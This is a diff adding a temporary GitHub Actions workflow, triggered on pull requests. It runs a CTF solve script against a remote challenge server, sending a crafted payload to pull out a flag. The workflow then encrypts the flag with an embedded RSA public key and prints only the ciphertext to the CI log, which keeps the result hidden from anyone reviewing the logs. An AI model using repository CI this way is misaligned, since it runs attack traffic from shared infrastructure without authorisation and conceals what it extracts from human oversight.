@@ -1,0 +1,77 @@
+name: temporary commbridge ctf runner
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  solve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Solve challenge and encrypt flag
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/solve.py <<'PY'
+          import hashlib
+          import re
+          import socket
+          import sys
+
+          HOST = "not-web.caplag-task.ru"
+          PORT = 30698
+          payload = b"@40AA@0147@0144@014d@0143@0113@0106@0105@0126"
+          request = b"1\noperator\n2\n" + payload + b"\n3\n0\n"
+
+          data = bytearray()
+          with socket.create_connection((HOST, PORT), timeout=10) as s:
+              s.settimeout(3)
+              s.sendall(request)
+              while True:
+                  try:
+                      chunk = s.recv(4096)
+                  except socket.timeout:
+                      break
+                  if not chunk:
+                      break
+                  data.extend(chunk)
+
+          match = re.search(rb"controller log:\s*(caplag\{[^}\r\n]{1,256}\})", bytes(data))
+          if not match:
+              print("flag pattern not found")
+              print("response_bytes=" + str(len(data)))
+              print("response_sha256=" + hashlib.sha256(data).hexdigest())
+              sys.exit(2)
+
+          with open("/tmp/flag.txt", "wb") as f:
+              f.write(match.group(1))
+          print("flag captured and withheld from logs")
+          PY
+
+          python3 /tmp/solve.py
+
+          cat > /tmp/pub.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlZf9b/x4K6117R1MbryE
+          9aT9ZWrOn7MjUNQI9IgLVQi4pHbJhY4MTw4e4BE2NkT3m7TmlxrdlbN84cS2c4q3
+          QURwH6aySCQxngySdzRx9co6YNJyfMDWidywUDvbJsTFtlDkPznEGU1Q6Q30k+uu
+          lTeEtRhp3tExOZUVauPZVhZMFmW6+4866zOh5GQDEa7g0Yha9ZfH6refrWBcwvwm
+          xRAq9m/EwbiUujG8B5nKXnk2BlPENHeMHilcYlvMYuQmofoZr7XTxIs7mEsgLr1h
+          v68atoTPx8Bi/u1/23mOGvkRoPaUilENeKIt4pnFn4ImAvTaAaMTxMobW6zvpB9o
+          VQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+
+          openssl pkeyutl -encrypt \
+            -pubin -inkey /tmp/pub.pem \
+            -pkeyopt rsa_padding_mode:oaep \
+            -pkeyopt rsa_oaep_md:sha256 \
+            -in /tmp/flag.txt -out /tmp/flag.bin
+
+          printf 'CIPHERTEXT='
+          base64 -w0 /tmp/flag.bin
+          printf '\n'
